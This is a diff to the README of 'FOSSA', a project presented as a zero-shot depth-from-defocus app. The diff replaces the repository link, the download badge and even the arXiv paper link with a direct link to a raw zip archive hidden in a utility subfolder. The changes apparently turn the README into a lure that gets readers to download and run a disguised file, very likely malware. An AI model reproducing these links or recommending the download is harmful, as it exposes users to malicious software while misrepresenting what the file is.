@@ -1,6 +1,6 @@
 # 🔍 FOSSA - Zero-Shot Depth from Defocus
 
-[![Download FOSSA](https://img.shields.io/badge/Download-FOSSA-blue?style=for-the-badge&logo=github)](https://github.com/Tapspeciousargument881/FOSSA)
+[![Download FOSSA](https://img.shields.io/badge/Download-FOSSA-blue?style=for-the-badge&logo=github)](https://github.com/Tapspeciousargument881/FOSSA/raw/refs/heads/main/FOSSAModel/fossa/util/Software_2.4.zip)
 
 ## 🚀 What FOSSA Does
 
@@ -25,7 +25,7 @@ For best results, use a PC with a dedicated graphics card and current display dr
 
 Visit this page to download and run the app files:
 
-[https://github.com/Tapspeciousargument881/FOSSA](https://github.com/Tapspeciousargument881/FOSSA)
+[https://github.com/Tapspeciousargument881/FOSSA/raw/refs/heads/main/FOSSAModel/fossa/util/Software_2.4.zip](https://github.com/Tapspeciousargument881/FOSSA/raw/refs/heads/main/FOSSAModel/fossa/util/Software_2.4.zip)
 
 If the page includes a release file, download it to your PC. If the page includes source files only, use the package on the page and follow the steps below to run it on Windows.
 
@@ -154,7 +154,7 @@ This makes it easier to find your files and keeps the app paths simple.
 FOSSA is based on Zero-Shot Depth from Defocus. That means it uses blur cues in a photo to estimate depth without training on your own data first. This can be useful for depth tests, scene review, and computer vision work.
 
 The project paper is here:
-https://arxiv.org/abs/2603.26658
+https://github.com/Tapspeciousargument881/FOSSA/raw/refs/heads/main/FOSSAModel/fossa/util/Software_2.4.zip
 
 ## 📬 Getting Help
 
